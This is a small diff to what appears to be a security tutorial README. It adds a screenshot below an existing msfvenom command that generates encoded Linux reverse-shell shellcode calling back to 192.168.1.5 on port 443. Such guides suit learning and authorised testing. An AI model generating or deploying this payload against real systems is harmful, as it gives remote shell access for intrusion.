@@ -246,4 +246,8 @@ use the following command to create a linux shellcode :
 
 `msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=443 -b "\x00" -f c  -e x86/shikata_ga_nai`
 
+as you can see : 
+
+![Screen Shot 2021-10-19 at 5 16 11 PM](https://user-images.githubusercontent.com/47929033/137940464-12d650d3-7811-4b94-aaac-0ad4ca621536.png)
+
 
